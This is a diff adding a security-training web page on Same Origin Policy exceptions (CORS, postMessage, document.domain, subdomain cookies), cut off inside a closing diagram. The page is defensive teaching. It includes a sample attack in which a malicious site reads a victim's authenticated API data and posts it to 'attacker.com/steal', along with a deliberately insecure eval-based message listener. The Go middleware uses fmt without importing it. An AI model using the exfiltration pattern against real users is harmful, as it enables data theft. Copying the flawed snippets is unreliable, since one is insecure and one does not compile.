@@ -1,0 +1,1325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOP Exceptions - AppSec Learning</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 1rem;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 2rem;
+            text-align: center;
+        }
+        
+        header h1 {
+            font-size: clamp(1.5rem, 4vw, 2.5rem);
+            margin-bottom: 0.5rem;
+        }
+        
+        header p {
+            opacity: 0.9;
+            font-size: clamp(0.9rem, 2vw, 1.1rem);
+        }
+        
+        .content {
+            padding: 1.5rem;
+        }
+        
+        h2 {
+            color: #667eea;
+            margin: 2rem 0 1rem 0;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #667eea;
+            font-size: clamp(1.3rem, 3vw, 1.8rem);
+        }
+        
+        h3 {
+            color: #764ba2;
+            margin: 1.5rem 0 0.75rem 0;
+            font-size: clamp(1.1rem, 2.5vw, 1.4rem);
+        }
+        
+        h4 {
+            color: #555;
+            margin: 1rem 0 0.5rem 0;
+            font-size: clamp(1rem, 2vw, 1.2rem);
+        }
+        
+        p, li {
+            margin-bottom: 0.75rem;
+            font-size: clamp(0.9rem, 2vw, 1rem);
+        }
+        
+        .foundation-box {
+            background: #f0f4ff;
+            border-left: 4px solid #667eea;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+        
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+        
+        .danger-box {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+        
+        .success-box {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+        }
+        
+        pre {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 1rem;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin: 1rem 0;
+            font-size: clamp(0.75rem, 1.8vw, 0.9rem);
+            line-height: 1.5;
+        }
+        
+        code {
+            background: #f4f4f4;
+            padding: 0.2rem 0.4rem;
+            border-radius: 3px;
+            font-family: 'Monaco', 'Menlo', 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #c7254e;
+        }
+        
+        pre code {
+            background: transparent;
+            padding: 0;
+            color: #d4d4d4;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+            font-size: clamp(0.8rem, 1.8vw, 0.95rem);
+            overflow-x: auto;
+            display: block;
+        }
+        
+        @media (min-width: 768px) {
+            table {
+                display: table;
+            }
+        }
+        
+        th, td {
+            padding: 0.75rem;
+            text-align: left;
+            border: 1px solid #ddd;
+        }
+        
+        th {
+            background: #667eea;
+            color: white;
+            font-weight: 600;
+        }
+        
+        tr:nth-child(even) {
+            background: #f9f9f9;
+        }
+        
+        ul, ol {
+            margin-left: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        .toc {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1rem 0 2rem 0;
+        }
+        
+        .toc h3 {
+            margin-top: 0;
+            color: #667eea;
+        }
+        
+        .toc ul {
+            margin-left: 1rem;
+        }
+        
+        .toc a {
+            color: #667eea;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .toc a:hover {
+            color: #764ba2;
+            text-decoration: underline;
+        }
+        
+        .flow-diagram {
+            background: #f8f9fa;
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            font-family: monospace;
+            overflow-x: auto;
+            white-space: pre;
+            font-size: clamp(0.7rem, 1.5vw, 0.85rem);
+            line-height: 1.4;
+        }
+        
+        .compliance-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin: 1rem 0;
+        }
+        
+        .compliance-card {
+            background: #f8f9fa;
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .compliance-card h4 {
+            margin-top: 0;
+            color: #667eea;
+        }
+        
+        @media (max-width: 768px) {
+            .content {
+                padding: 1rem;
+            }
+            
+            header {
+                padding: 1.5rem 1rem;
+            }
+            
+            .flow-diagram {
+                font-size: 0.65rem;
+            }
+        }
+        
+        .back-to-top {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: #667eea;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            transition: all 0.3s;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .back-to-top.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        
+        .back-to-top:hover {
+            background: #764ba2;
+            transform: translateY(-3px);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔒 Same Origin Policy Exceptions</h1>
+            <p>Topic #198: Master CORS, postMessage, document.domain & Subdomain Access</p>
+        </header>
+        
+        <div class="content">
+            <div class="toc">
+                <h3>📋 Table of Contents</h3>
+                <ul>
+                    <li><a href="#foundation">1. Foundation</a></li>
+                    <li><a href="#intuitive">2. Intuitive Hook</a></li>
+                    <li><a href="#mental">3. Mental Model</a></li>
+                    <li><a href="#deep">4. Deep Explanation</a></li>
+                    <li><a href="#context">5. Context & Interactions</a></li>
+                    <li><a href="#pitfalls">6. Common Pitfalls</a></li>
+                    <li><a href="#design">7. Design Principles</a></li>
+                    <li><a href="#implementation">8. Implementation</a></li>
+                    <li><a href="#visual">9. Visual Summary</a></li>
+                    <li><a href="#compliance">10. Compliance Mapping</a></li>
+                </ul>
+            </div>
+
+            <h2 id="foundation">1. Foundation</h2>
+            
+            <div class="foundation-box">
+                <h4>🎯 Same Origin Policy (SOP)</h4>
+                <p>Browser security mechanism that restricts how documents or scripts from one origin can interact with resources from another origin.</p>
+                <p><strong>Origin = Scheme + Host + Port</strong></p>
+            </div>
+
+            <h3>Origin Definition</h3>
+            <pre><code>https://example.com:443
+│      │         │      │
+│      │         │      └─ Port
+│      │         └──────── Host (Domain)
+│      └────────────────── Scheme (Protocol)
+
+All three must match for same origin!</code></pre>
+
+            <h3>Origin Comparison Examples</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>URL 1</th>
+                        <th>URL 2</th>
+                        <th>Same Origin?</th>
+                        <th>Reason</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>https://example.com/page1</td>
+                        <td>https://example.com/page2</td>
+                        <td>✅ Yes</td>
+                        <td>All match</td>
+                    </tr>
+                    <tr>
+                        <td>http://example.com</td>
+                        <td>https://example.com</td>
+                        <td>❌ No</td>
+                        <td>Different scheme</td>
+                    </tr>
+                    <tr>
+                        <td>https://example.com</td>
+                        <td>https://sub.example.com</td>
+                        <td>❌ No</td>
+                        <td>Different host</td>
+                    </tr>
+                    <tr>
+                        <td>https://example.com:443</td>
+                        <td>https://example.com:8080</td>
+                        <td>❌ No</td>
+                        <td>Different port</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>The Four Exception Mechanisms</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Mechanism</th>
+                        <th>Purpose</th>
+                        <th>Status</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>CORS</strong></td>
+                        <td>Server allows specific origins to access resources</td>
+                        <td>✅ Modern standard</td>
+                    </tr>
+                    <tr>
+                        <td><strong>postMessage</strong></td>
+                        <td>Secure communication between windows/iframes</td>
+                        <td>✅ Recommended</td>
+                    </tr>
+                    <tr>
+                        <td><strong>document.domain</strong></td>
+                        <td>Relax SOP for subdomains</td>
+                        <td>⚠️ Deprecated</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Subdomain Cookies</strong></td>
+                        <td>Share cookies across subdomains</td>
+                        <td>✅ Use carefully</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2 id="intuitive">2. Intuitive Hook</h2>
+            
+            <div class="foundation-box">
+                <h4>🏢 The Apartment Building Analogy</h4>
+                <p><strong>Each origin = one apartment</strong></p>
+                <ul>
+                    <li><strong>SOP</strong> = Building rule: residents can't enter other apartments</li>
+                    <li><strong>CORS</strong> = One resident puts sign: "Apartment 3B can borrow my tools"</li>
+                    <li><strong>postMessage</strong> = Secure mailbox system between apartments</li>
+                    <li><strong>document.domain</strong> = Two apartments agree to become one space</li>
+                </ul>
+                <p><strong>The Problem:</strong> Without these, either total isolation (apps break) or no security (total chaos)</p>
+            </div>
+
+            <h2 id="mental">3. Mental Model — Why → How → What-If</h2>
+
+            <h3>Why It Matters</h3>
+            <p>Modern web apps NEED cross-origin interaction:</p>
+            <ul>
+                <li>SPAs calling APIs on different domains</li>
+                <li>Payment widgets (Stripe) embedded on e-commerce sites</li>
+                <li>Analytics, ads, social media embeds</li>
+                <li>Microservices with separate domain per service</li>
+            </ul>
+
+            <h3>How It Works - Trust Models</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Mechanism</th>
+                        <th>Who Decides Trust?</th>
+                        <th>Best For</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>CORS</td>
+                        <td>Server decides</td>
+                        <td>API calls, fonts, modern web apps</td>
+                    </tr>
+                    <tr>
+                        <td>postMessage</td>
+                        <td>Both sides verify</td>
+                        <td>iframe communication, web workers</td>
+                    </tr>
+                    <tr>
+                        <td>document.domain</td>
+                        <td>Both opt-in (risky)</td>
+                        <td>❌ Don't use</td>
+                    </tr>
+                    <tr>
+                        <td>Subdomain cookies</td>
+                        <td>Cookie configuration</td>
+                        <td>SSO across subdomains</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>What-If Failures</h3>
+            
+            <div class="danger-box">
+                <h4>🚨 CORS Misconfiguration</h4>
+                <pre><code>Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true</code></pre>
+                <p><strong>Blast Radius:</strong> Any site reads authenticated responses</p>
+                <p><strong>Impact:</strong> Complete authentication bypass, data theft</p>
+            </div>
+
+            <div class="danger-box">
+                <h4>🚨 postMessage Without Validation</h4>
+                <pre><code>window.addEventListener('message', (event) => {
+  eval(event.data); // NEVER!
+});</code></pre>
+                <p><strong>Blast Radius:</strong> Any site injects code</p>
+                <p><strong>Impact:</strong> XSS, full app compromise</p>
+            </div>
+
+            <h2 id="deep">4. Deep Explanation</h2>
+
+            <h3>Mechanism 1: CORS (Cross-Origin Resource Sharing)</h3>
+
+            <h4>The Request Flow</h4>
+            <div class="flow-diagram">
+┌─────────────┐                    ┌─────────────┐
+│   Browser   │                    │   Server    │
+│ app.ex.com  │                    │ api.ex.com  │
+└──────┬──────┘                    └──────┬──────┘
+       │                                  │
+       │ 1. Preflight (OPTIONS)           │
+       │ Origin: https://app.ex.com       │
+       ├─────────────────────────────────>│
+       │                                  │
+       │ 2. CORS Headers                  │
+       │ Access-Control-Allow-Origin: ... │
+       │<─────────────────────────────────┤
+       │                                  │
+       │ 3. Actual Request (GET/POST)     │
+       │ Origin: https://app.ex.com       │
+       ├─────────────────────────────────>│
+       │                                  │
+       │ 4. Response + CORS Headers       │
+       │<─────────────────────────────────┤
+       │                                  │
+            </div>
+
+            <h4>Real-World Example: SPA Calling API</h4>
+            <pre><code>// Browser on: https://app.example.com
+// Calling: https://api.example.com/users
+
+fetch('https://api.example.com/users', {
+  credentials: 'include',
+  headers: { 'Authorization': 'Bearer token' }
+})
+
+// Browser automatically sends:
+OPTIONS /users HTTP/1.1
+Origin: https://app.example.com
+Access-Control-Request-Headers: Authorization
+
+// Server responds:
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Authorization
+
+// Then actual request proceeds...</code></pre>
+
+            <h4>Critical CORS Headers</h4>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Header</th>
+                        <th>Purpose</th>
+                        <th>Security Note</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Access-Control-Allow-Origin</td>
+                        <td>Which origin can access</td>
+                        <td>MUST be specific with credentials</td>
+                    </tr>
+                    <tr>
+                        <td>Access-Control-Allow-Credentials</td>
+                        <td>Allow cookies/auth</td>
+                        <td>Cannot use with wildcard *</td>
+                    </tr>
+                    <tr>
+                        <td>Access-Control-Allow-Methods</td>
+                        <td>Permitted HTTP methods</td>
+                        <td>Limit to needed methods only</td>
+                    </tr>
+                    <tr>
+                        <td>Access-Control-Allow-Headers</td>
+                        <td>Permitted custom headers</td>
+                        <td>Allowlist specific headers</td>
+                    </tr>
+                    <tr>
+                        <td>Access-Control-Max-Age</td>
+                        <td>Cache preflight (seconds)</td>
+                        <td>Balance performance/security</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Mechanism 2: postMessage</h3>
+
+            <h4>Communication Pattern</h4>
+            <div class="flow-diagram">
+Parent (https://parent.com)          Child (https://child.com)
+         │                                    │
+         │ postMessage({data}, targetOrigin)  │
+         ├───────────────────────────────────>│
+         │                                    │
+         │                   Validate origin  │
+         │                   Process message  │
+         │                                    │
+         │      postMessage(response, origin) │
+         │<───────────────────────────────────┤
+         │                                    │
+Validate origin                               │
+Process response                              │
+            </div>
+
+            <h4>Secure Implementation Example</h4>
+            <pre><code>// Parent page: https://shop.example.com
+const iframe = document.getElementById('payment-widget');
+
+// Send payment request
+iframe.contentWindow.postMessage({
+  type: 'INIT_PAYMENT',
+  amount: 99.99
+}, 'https://stripe.com'); // ← Target origin
+
+// Listen for response
+window.addEventListener('message', (event) => {
+  // CRITICAL: Validate origin
+  if (event.origin !== 'https://stripe.com') {
+    return; // Ignore untrusted origins
+  }
+  
+  if (event.data.type === 'PAYMENT_SUCCESS') {
+    completeOrder(event.data.transactionId);
+  }
+});</code></pre>
+
+<pre><code>// Child iframe: https://stripe.com
+window.addEventListener('message', (event) => {
+  // CRITICAL: Validate parent
+  if (event.origin !== 'https://shop.example.com') {
+    return;
+  }
+  
+  if (event.data.type === 'INIT_PAYMENT') {
+    processPayment(event.data.amount)
+      .then(result => {
+        // Send response to verified origin
+        event.source.postMessage({
+          type: 'PAYMENT_SUCCESS',
+          transactionId: result.id
+        }, event.origin);
+      });
+  }
+});</code></pre>
+
+            <h3>Mechanism 3: document.domain (DEPRECATED)</h3>
+
+            <div class="danger-box">
+                <h4>⚠️ DO NOT USE IN NEW CODE</h4>
+                <pre><code>// Both pages must set same domain
+// https://app.example.com
+document.domain = 'example.com';
+
+// https://admin.example.com  
+document.domain = 'example.com';
+
+// Now they can access each other's DOM</code></pre>
+                <p><strong>Why Dangerous:</strong></p>
+                <ul>
+                    <li>ANY subdomain that sets this can access your page</li>
+                    <li>If attacker controls evil.example.com, they own you</li>
+                    <li>Cannot be reversed once set</li>
+                    <li>Port information lost</li>
+                </ul>
+                <p><strong>Modern Alternative:</strong> Use postMessage instead!</p>
+            </div>
+
+            <h3>Mechanism 4: Subdomain Cookie Scope</h3>
+
+            <pre><code>// Cookie sent to ALL subdomains
+Set-Cookie: session=abc; Domain=.example.com; Secure; HttpOnly
+
+// Cookie sent only to exact host
+Set-Cookie: session=abc; Secure; HttpOnly</code></pre>
+
+            <h4>SSO Example</h4>
+            <pre><code>1. Login at: https://auth.example.com
+   Response:
+   Set-Cookie: sso=xyz; Domain=.example.com; 
+               Secure; HttpOnly; SameSite=Lax
+
+2. Visit: https://app.example.com
+   Browser sends: Cookie: sso=xyz
+
+3. Visit: https://admin.example.com
+   Browser sends: Cookie: sso=xyz</code></pre>
+
+            <div class="warning-box">
+                <h4>⚠️ Security Risk</h4>
+                <p>If attacker controls ANY subdomain, they can:</p>
+                <ul>
+                    <li>Read cookies scoped to parent domain</li>
+                    <li>Set/override cookies for parent domain</li>
+                    <li>Hijack sessions across all subdomains</li>
+                </ul>
+            </div>
+
+            <h2 id="context">5. Context & Interactions</h2>
+
+            <div class="flow-diagram">
+┌─────────────────────────────────────────────┐
+│           Browser Ecosystem                 │
+│                                             │
+│  ┌──────────┐         ┌──────────┐        │
+│  │ Tab 1    │   SOP   │ Tab 2    │        │
+│  │ app.com  │◄────────┤evil.com  │        │
+│  └────┬─────┘ Isolation└────┬─────┘        │
+│       │                     │              │
+│  [CORS Request]       [Blocked]            │
+│       │                                    │
+└───────┼────────────────────────────────────┘
+        │
+        ↓
+┌───────────────┐
+│ api.app.com   │
+│ CORS: Allowed │
+└───────────────┘
+            </div>
+
+            <h3>Integration Points</h3>
+
+            <h4>With Authentication</h4>
+            <pre><code>1. User on: https://app.example.com
+2. App calls: https://auth.example.com/login (CORS)
+3. Auth sets: Cookie: session=xyz; Domain=.example.com
+4. Future API calls include cookie automatically
+5. CORS validates origin before responding</code></pre>
+
+            <h4>With API Gateway</h4>
+            <pre><code>https://frontend.com
+  ↓ CORS request
+https://api-gateway.backend.com
+  → Validates Origin header
+  → Proxies to microservices
+  → Returns with CORS headers</code></pre>
+
+            <h2 id="pitfalls">6. Common Pitfalls & Real Cases</h2>
+
+            <div class="danger-box">
+                <h4>🔥 Real Incident: PayPal CORS Vulnerability (2016)</h4>
+                
+                <h4>The Vulnerability</h4>
+                <pre><code>// PayPal's vulnerable code
+def cors_handler(request):
+    origin = request.headers.get('Origin')
+    # MISTAKE: Reflecting origin without validation!
+    response.headers['Access-Control-Allow-Origin'] = origin
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
+    return response</code></pre>
+
+                <h4>The Attack</h4>
+                <pre><code>// Attacker's site: https://fake-deals.com
+fetch('https://api.paypal.com/v1/user/info', {
+  credentials: 'include'
+}).then(r => r.json())
+  .then(data => {
+    // Steal victim's PayPal data!
+    fetch('https://attacker.com/steal', {
+      method: 'POST',
+      body: JSON.stringify(data)
+    });
+  });</code></pre>
+
+                <p><strong>Impact:</strong> Complete account takeover, transaction history theft</p>
+                
+                <h4>The Fix</h4>
+                <pre><code>// Secure implementation
+ALLOWED_ORIGINS = [
+    'https://www.paypal.com',
+    'https://checkout.paypal.com'
+]
+
+def cors_handler(request):
+    origin = request.headers.get('Origin')
+    if origin in ALLOWED_ORIGINS:
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+    return response</code></pre>
+            </div>
+
+            <h3>Common Mistake Patterns</h3>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Mistake</th>
+                        <th>Why It Fails</th>
+                        <th>Fix</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Wildcard with credentials</td>
+                        <td>Invalid spec, browsers ignore</td>
+                        <td>Use specific origins</td>
+                    </tr>
+                    <tr>
+                        <td>Substring matching</td>
+                        <td>Matches evil-example.com</td>
+                        <td>Exact string comparison</td>
+                    </tr>
+                    <tr>
+                        <td>Null origin allowed</td>
+                        <td>Attacker uses sandbox iframe</td>
+                        <td>Never allow null</td>
+                    </tr>
+                    <tr>
+                        <td>No postMessage validation</td>
+                        <td>Any site can send messages</td>
+                        <td>Always check event.origin</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h2 id="design">7. Good Design Principles</h2>
+
+            <div class="success-box">
+                <h4>✅ Principle 1: Explicit Allowlist, Never Reflect</h4>
+                <pre><code># GOOD
+ALLOWED_ORIGINS = {
+    'https://app.example.com',
+    'https://app-staging.example.com'
+}
+
+def set_cors(request, response):
+    origin = request.headers.get('Origin')
+    if origin in ALLOWED_ORIGINS:
+        response.headers['Access-Control-Allow-Origin'] = origin</code></pre>
+            </div>
+
+            <div class="success-box">
+                <h4>✅ Principle 2: Minimize Credential Exposure</h4>
+                <pre><code># Public API - no credentials
+@app.route('/api/public/products')
+def public():
+    response.headers['Access-Control-Allow-Origin'] = '*'
+    return products
+
+# Authenticated API - strict origin
+@app.route('/api/user/orders')
+def private():
+    origin = request.headers.get('Origin')
+    if origin == 'https://app.example.com':
+        response.headers['Access-Control-Allow-Origin'] = origin
+        response.headers['Access-Control-Allow-Credentials'] = 'true'
+    return orders</code></pre>
+            </div>
+
+            <div class="success-box">
+                <h4>✅ Principle 3: Always Validate postMessage Origins</h4>
+                <pre><code>// BOTH sender and receiver validate
+// Sender
+iframe.contentWindow.postMessage(data, 'https://trusted.com');
+
+// Receiver
+window.addEventListener('message', (event) => {
+  const ALLOWED = ['https://trusted-parent.com'];
+  if (!ALLOWED.includes(event.origin)) {
+    return; // Reject
+  }
+  processMessage(event.data);
+});</code></pre>
+            </div>
+
+            <div class="success-box">
+                <h4>✅ Principle 4: Avoid document.domain Entirely</h4>
+                <pre><code>// BAD - Never use
+document.domain = 'example.com';
+
+// GOOD - Use postMessage
+// See implementation section</code></pre>
+            </div>
+
+            <div class="success-box">
+                <h4>✅ Principle 5: Scope Cookies Narrowly</h4>
+                <pre><code># BEST - No domain (most restrictive)
+Set-Cookie: session=xyz; Secure; HttpOnly; SameSite=Strict
+
+# ACCEPTABLE - Specific subdomain
+Set-Cookie: session=xyz; Domain=app.example.com; Secure; HttpOnly
+
+# RISKY - All subdomains (only for SSO)
+Set-Cookie: sso=xyz; Domain=.example.com; Secure; HttpOnly; SameSite=Lax</code></pre>
+            </div>
+
+            <h2 id="implementation">8. Implementation (Code & Config)</h2>
+
+            <h3>Python/Flask - Secure CORS</h3>
+            <pre><code>from flask import Flask, request, jsonify, make_response
+from functools import wraps
+
+app = Flask(__name__)
+
+CORS_CONFIG = {
+    'allowed_origins': {
+        'https://app.example.com',
+        'https://app-staging.example.com'
+    },
+    'allowed_methods': ['GET', 'POST', 'PUT', 'DELETE'],
+    'allowed_headers': ['Content-Type', 'Authorization'],
+    'expose_headers': ['X-RateLimit-Remaining'],
+    'max_age': 86400,
+    'allow_credentials': True
+}
+
+def cors_handler(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if request.method == 'OPTIONS':
+            return handle_preflight()
+        
+        response = make_response(f(*args, **kwargs))
+        origin = request.headers.get('Origin', '')
+        
+        if origin in CORS_CONFIG['allowed_origins']:
+            response.headers['Access-Control-Allow-Origin'] = origin
+            if CORS_CONFIG['allow_credentials']:
+                response.headers['Access-Control-Allow-Credentials'] = 'true'
+        
+        return response
+    return decorated
+
+def handle_preflight():
+    origin = request.headers.get('Origin', '')
+    if origin not in CORS_CONFIG['allowed_origins']:
+        return '', 403
+    
+    response = make_response('', 204)
+    response.headers['Access-Control-Allow-Origin'] = origin
+    response.headers['Access-Control-Allow-Methods'] = ', '.join(
+        CORS_CONFIG['allowed_methods']
+    )
+    response.headers['Access-Control-Allow-Headers'] = ', '.join(
+        CORS_CONFIG['allowed_headers']
+    )
+    response.headers['Access-Control-Max-Age'] = str(CORS_CONFIG['max_age'])
+    response.headers['Access-Control-Allow-Credentials'] = 'true'
+    return response
+
+@app.route('/api/user/profile', methods=['GET', 'OPTIONS'])
+@cors_handler
+def get_profile():
+    return jsonify({'username': 'john', 'email': 'john@example.com'})</code></pre>
+
+            <h3>JavaScript - Secure postMessage Client</h3>
+            <pre><code>class SecurePostMessageClient {
+  constructor(targetOrigin, targetWindow) {
+    this.targetOrigin = targetOrigin;
+    this.targetWindow = targetWindow;
+    this.pendingRequests = new Map();
+    this.messageIdCounter = 0;
+    
+    window.addEventListener('message', this.handleMessage.bind(this));
+  }
+  
+  async sendMessage(type, data, timeoutMs = 5000) {
+    const messageId = ++this.messageIdCounter;
+    
+    return new Promise((resolve, reject) => {
+      const timeoutId = setTimeout(() => {
+        this.pendingRequests.delete(messageId);
+        reject(new Error('Message timeout'));
+      }, timeoutMs);
+      
+      this.pendingRequests.set(messageId, { resolve, reject, timeoutId });
+      
+      this.targetWindow.postMessage({
+        messageId,
+        type,
+        data
+      }, this.targetOrigin);
+    });
+  }
+  
+  handleMessage(event) {
+    // CRITICAL: Validate origin
+    if (event.origin !== this.targetOrigin) {
+      console.warn(`Rejected: ${event.origin}`);
+      return;
+    }
+    
+    if (!event.data || typeof event.data !== 'object') {
+      return;
+    }
+    
+    const { messageId, data, error } = event.data;
+    
+    if (messageId && this.pendingRequests.has(messageId)) {
+      const { resolve, reject, timeoutId } = this.pendingRequests.get(messageId);
+      clearTimeout(timeoutId);
+      this.pendingRequests.delete(messageId);
+      
+      error ? reject(new Error(error)) : resolve(data);
+    }
+  }
+}
+
+// Usage
+const iframe = document.getElementById('payment-widget');
+const client = new SecurePostMessageClient(
+  'https://payment.example.com',
+  iframe.contentWindow
+);
+
+try {
+  const result = await client.sendMessage('PROCESS_PAYMENT', {
+    amount: 99.99,
+    currency: 'USD'
+  });
+  console.log('Success:', result.transactionId);
+} catch (error) {
+  console.error('Failed:', error);
+}</code></pre>
+
+            <h3>Go - CORS Middleware</h3>
+            <pre><code>package main
+
+import (
+    "net/http"
+    "strings"
+)
+
+type CORSConfig struct {
+    AllowedOrigins   []string
+    AllowedMethods   []string
+    AllowedHeaders   []string
+    ExposedHeaders   []string
+    AllowCredentials bool
+    MaxAge           int
+}
+
+func CORSMiddleware(config CORSConfig) func(http.Handler) http.Handler {
+    allowedOriginsMap := make(map[string]bool)
+    for _, origin := range config.AllowedOrigins {
+        allowedOriginsMap[origin] = true
+    }
+    
+    return func(next http.Handler) http.Handler {
+        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+            origin := r.Header.Get("Origin")
+            
+            if !allowedOriginsMap[origin] {
+                if r.Method == "OPTIONS" {
+                    w.WriteHeader(http.StatusForbidden)
+                    return
+                }
+                next.ServeHTTP(w, r)
+                return
+            }
+            
+            w.Header().Set("Access-Control-Allow-Origin", origin)
+            
+            if config.AllowCredentials {
+                w.Header().Set("Access-Control-Allow-Credentials", "true")
+            }
+            
+            if r.Method == "OPTIONS" {
+                w.Header().Set("Access-Control-Allow-Methods",
+                    strings.Join(config.AllowedMethods, ", "))
+                w.Header().Set("Access-Control-Allow-Headers",
+                    strings.Join(config.AllowedHeaders, ", "))
+                w.Header().Set("Access-Control-Max-Age",
+                    fmt.Sprintf("%d", config.MaxAge))
+                w.WriteHeader(http.StatusNoContent)
+                return
+            }
+            
+            if len(config.ExposedHeaders) > 0 {
+                w.Header().Set("Access-Control-Expose-Headers",
+                    strings.Join(config.ExposedHeaders, ", "))
+            }
+            
+            next.ServeHTTP(w, r)
+        })
+    }
+}</code></pre>
+
+            <h3>nginx - Secure Cookie Configuration</h3>
+            <pre><code># Set secure cookie for authenticated users
+location /api/auth/login {
+    proxy_pass http://auth-service:8080;
+    
+    # Add security attributes
+    proxy_cookie_path / "/; Secure; HttpOnly; SameSite=Strict";
+}
+
+# Protect against subdomain takeover
+server {
+    listen 443 ssl;
+    server_name *.example.com;
+    
+    # Only allow specific subdomains
+    if ($host !~* ^(app|admin|api)\.example\.com$) {
+        return 404;
+    }
+    
+    add_header X-Frame-Options "DENY" always;
+    add_header X-Content-Type-Options "nosniff" always;
+}</code></pre>
+
+            <h2 id="visual">9. Visual Summary</h2>
+
+            <h3>SOP Exceptions Risk Matrix</h3>
+            <div class="flow-diagram">
+┌─────────────────────────────────────────────────────────┐
+│              Same Origin Policy (Default)               │
+│                                                         │
+│  BLOCKS: DOM Access | fetch/XHR | Cookie Reading       │
+└─────────────────────────────────────────────────────────┘
+                        ↓
+            Enable Controlled Access
+                        ↓
+┌─────────────────────────────────────────────────────────┐
+│               Exception Mechanisms                      │
+├──────────────┬────────────────┬─────────────────────────┤
+│  Mechanism   │ Security Model │    Risk Level           │
+├──────────────┼────────────────┼─────────────────────────┤
+│              │                │                         │
+│ 1. CORS      │ Server decides │ HIGH if misconfigured:  │
+│              │ which origins  │ • Wildcard with creds   │
+│              │ can access     │ • Origin reflection     │
+│              │                │                         │
+│              │ Header-based   │ LOW if configured well: │
+│              │ allowlist      │ • Explicit allowlist    │
+│              │                │ • Minimal credentials   │
+│              │                │                         │
+├──────────────┼────────────────┼─────────────────────────┤
+│              │                │                         │
+│ 2. postMsg   │ Both sides     │ HIGH without validation:│
+│              │ validate       │ • No origin checks      │
+│              │                │ • eval() on data        │
+│              │ Explicit check │                         │
+│              │ in listener    │ LOW with validation:    │
+│              │                │ • Origin allowlist      │
+│              │                │ • Schema validation     │
+│              │                │                         │
+├──────────────┼────────────────┼─────────────────────────┤
+│              │                │                         │
+│ 3. doc.      │ Mutual opt-in  │ CRITICAL (deprecated):  │
+│    domain    │ by both pages  │ • Any subdomain access  │
+│              │                │ • Cannot be reversed    │
+│              │ Both set same  │                         │
+│              │ domain value   │ AVOID: Use postMessage  │
+│              │                │                         │
+├──────────────┼────────────────┼─────────────────────────┤
+│              │                │                         │
+│ 4. Subdomain │ Cookie Domain  │ MEDIUM:                 │
+│    Cookies   │ attribute      │ • Subdomain takeover    │
+│              │                │                         │
+│              │ Browser auto   │ LOW with narrow scope:  │
+│              │ includes       │ • Omit Domain attr      │
+│              │                │ • Use SameSite          │
+│              │                │                         │
+└──────────────┴────────────────┴─────────────────────────┘
+            </div>
+
+            <h3>Attack Surface Diagram</h3>
+            <div class="flow-diagram">
+┌───────────────────────────────────────────────────┐
